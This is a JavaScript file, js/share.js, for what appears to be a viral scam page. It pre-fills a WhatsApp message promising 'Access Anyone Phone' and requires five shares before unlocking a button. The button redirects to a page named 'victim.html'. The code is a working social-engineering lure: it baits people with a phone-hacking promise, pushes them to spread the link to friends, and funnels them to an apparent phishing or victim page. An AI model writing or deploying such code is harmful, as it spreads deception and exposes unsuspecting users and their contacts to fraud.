// js/share.js

document.addEventListener("DOMContentLoaded", function() {
  const shareBtn = document.getElementById("shareBtn");
  const continueBtn = document.getElementById("continueBtn");
  const shareCountText = document.getElementById("shareCount");

  let shareCount = 0;
  const requiredShares = 5;

  // Predefined WhatsApp message
  const shareMessage = encodeURIComponent("Access Anyone Phone.....\nhttps://your-website-link.com");

  // WhatsApp share click
  shareBtn.addEventListener("click", function() {
    // Open WhatsApp with pre-filled message
    window.open(`https://wa.me/?text=${shareMessage}`, "_blank");

    // Increase share count
    shareCount++;
    shareCountText.textContent = shareCount;

    // Check if shares reached required number
    if (shareCount >= requiredShares) {
      continueBtn.disabled = false;
      continueBtn.classList.remove("btn-locked");
      continueBtn.classList.add("btn-active");
    }
  });

  // When continue button is clicked
  continueBtn.addEventListener("click", function() {
    if (shareCount >= requiredShares) {
      window.location.href = "victim.html";
    } else {
      alert("Please share with 5 friends first!");
    }
  });
});
